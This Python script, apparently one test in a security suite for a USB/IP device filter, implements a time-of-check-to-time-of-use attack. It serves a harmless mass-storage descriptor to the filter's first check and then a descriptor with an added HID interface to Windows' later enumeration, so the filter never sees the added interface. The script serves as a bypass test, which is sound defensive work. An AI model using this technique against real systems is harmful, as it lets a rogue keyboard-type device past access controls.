#!/usr/bin/env python3
"""Attack #10: descriptor TOCTOU.

Serve a BENIGN configuration descriptor to the first GET_DESCRIPTOR(CONFIGURATION)
(the filter's in-kernel fetch), then a MALICIOUS one (adds an HID interface) to
every later GET_DESCRIPTOR(CONFIGURATION) (Windows' enumeration).

Run on the server (root), bound to a software UDC, then export the UDC over
USB/IP and attach from Windows with a policy that allows ONLY mass_storage.

Desired outcome: Windows must NOT end up with an HID interface the filter never
evaluated. If it does, that is a real bypass -> file it.
"""

from __future__ import annotations

import usb_descriptors as d
from _raw_gadget import GET_DESCRIPTOR, ControlRequest, RawGadget

VID, PID = 0x16C0, 0x03F0

_config_request_count = 0


def on_control(req: ControlRequest) -> bytes | None:
    global _config_request_count

    if req.bRequest == GET_DESCRIPTOR and req.descriptor_type == d.DT_DEVICE:
        # Device class 0x00 => "defined at interface level" so the filter relies
        # on the (lied-about) configuration descriptor.
        return d.device_descriptor(vid=VID, pid=PID, b_device_class=0x00)

    if req.bRequest == GET_DESCRIPTOR and req.descriptor_type == d.DT_CONFIG:
        _config_request_count += 1
        if _config_request_count == 1:
            print("[toctou] serving BENIGN config (mass storage only) to fetch #1")
            return d.benign_mass_storage_config()
        print(f"[toctou] serving MALICIOUS config (ms+hid) to fetch #{_config_request_count}")
        return d.malicious_ms_plus_hid_config()

    return None  # STALL everything else


if __name__ == "__main__":
    print("raw_gadget TOCTOU profile. Validate _raw_gadget ioctls before running.")
    RawGadget().serve(on_control)
